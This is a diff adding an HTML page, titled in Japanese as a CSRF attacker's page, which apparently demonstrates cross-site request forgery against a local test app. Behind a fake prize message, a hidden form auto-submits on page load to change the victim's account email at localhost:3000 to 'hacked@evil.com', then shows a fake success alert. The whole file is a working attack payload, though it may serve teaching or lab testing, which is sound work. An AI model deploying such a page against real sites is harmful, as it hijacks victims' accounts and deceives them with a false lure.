@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF 攻撃者のページ</title>
+  <meta charset="UTF-8">
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+    .content { margin: 20px 0; }
+  </style>
+</head>
+<body>
+  <h1>CSRF 攻撃者用ページ</h1>
+  
+  <div class="content">
+    <p>このページを訪問していただきありがとうございます！</p>
+    <p>あなたは素晴らしい賞品に当選するチャンスがあります。</p>
+    
+    <!-- 隠しCSRF攻撃フォーム - 自動的に送信される -->
+    <iframe style="display:none" name="hidden-frame"></iframe>
+    <form id="csrf-form" action="http://localhost:3000/update_email" method="post" target="hidden-frame">
+      <input type="hidden" name="email" value="hacked@evil.com">
+    </form>
+    
+    <script>
+      // ページ読み込み時に自動的にフォームを送信
+      window.onload = function() {
+        document.getElementById('csrf-form').submit();
+        // 送信成功を偽装
+        setTimeout(function() {
+          alert('おめでとうございます！エントリーが完了しました！');
+        }, 1000);
+      };
+    </script>
+  </div>
+</body>
+</html>
